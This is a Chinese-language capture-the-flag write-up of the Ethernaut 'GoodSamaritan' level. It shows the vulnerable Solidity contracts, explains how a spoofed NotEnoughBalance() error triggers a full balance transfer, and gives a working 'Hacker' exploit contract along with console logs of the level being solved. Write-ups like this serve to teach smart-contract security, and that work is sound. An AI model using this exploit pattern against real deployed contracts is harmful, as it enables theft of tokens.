# 28 GoodSamaritan

## 思路

目标: 将钱包中的Token清空

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

题目很简单, 任何人都可以调用 `requestDonation()` 获取10个token的捐赠, 只要有耐心, 对方钱包早晚得空. 

(用for循环调用requestDonation的话, 调用次数太多, 很容易out of gas)

很容易找到题目的问题所在: 如果报错NotEnoughBalance(), 则将钱包余额发送出去.

```solidity
if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
}
```

所以, 请求方可以模拟发送这个错误, 就能得到钱包的所有余额

## 参考答案

```solidity

contract Hacker is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if(10 == amount)
            revert NotEnoughBalance();
    }

    function run(address _target) public {

        GoodSamaritan good = GoodSamaritan(
            _target
        );        
       good.requestDonation();
       
    }
}

//需要通过合约来发送请求, 不然无法满足 if(dest_.isContract()) 
contract Solution{
    function fix(address _target) public {
        Hacker h = new Hacker();
        h.run(_target);
    }

```

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1677132380243392000.png?raw=true)

```
instance
"0xE699Df4Db4104418246a307e4c3F3026C943E34f"
redux-logger.js:1  action SET_BLOCK_NUM @ 13:42:24.329
redux-logger.js:1  action SET_BLOCK_NUM @ 13:42:44.330
redux-logger.js:1  action SET_GAS_PRICE @ 13:43:54.331
^^.js:45 =^..^= 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 13:53:03.784
redux-logger.js:1  action SET_BLOCK_NUM @ 13:53:05.421
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xc03b9457afb2565da1ef76284054ddd97387da19a572bdf8d159bc4a740ae213
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 13:53:09.469
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xc03b9457afb2565da1ef76284054ddd97387da19a572bdf8d159bc4a740ae213
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:73 ☚ (<‿<)☚ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 13:53:14.470

```

